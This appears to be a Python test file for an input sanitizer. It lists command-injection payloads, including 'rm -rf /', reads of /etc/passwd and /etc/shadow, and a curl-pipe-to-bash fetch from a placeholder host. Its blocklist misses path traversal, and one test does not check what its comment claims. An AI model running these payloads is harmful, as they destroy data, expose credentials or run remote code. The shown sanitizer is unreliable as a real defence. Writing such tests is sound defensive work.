#!/usr/bin/env python3
"""Security validation tests — payloads here are for testing ONLY."""
import subprocess

# Dangerous inputs that our sanitizer MUST reject
DANGEROUS_INPUTS = [
    '; rm -rf /',
    '| cat /etc/passwd',
    '$(curl http://example.com/shell.sh | bash)',
    '`wget http://example.invalid/malware`',
    '../../../etc/shadow',
    'eval(compile(base64.b64decode("..."), "", "exec"))',
]

def test_command_injection_blocked():
    """Verify that command injection payloads are rejected."""
    for payload in DANGEROUS_INPUTS:
        result = sanitize_input(payload)
        assert result is None or ';' not in result

def test_subprocess_safe_mode():
    """Verify subprocess calls use safe arguments."""
    # This tests that our wrapper rejects shell=True
    safe_result = subprocess.run(
        ['echo', 'test'], capture_output=True, text=True,
    )
    assert safe_result.returncode == 0

def sanitize_input(s: str) -> str | None:
    blocklist = [';', '|', '`', '$(']
    for c in blocklist:
        if c in s:
            return None
    return s

if __name__ == '__main__':
    test_command_injection_blocked()
    test_subprocess_safe_mode()
    print('All security tests passed')
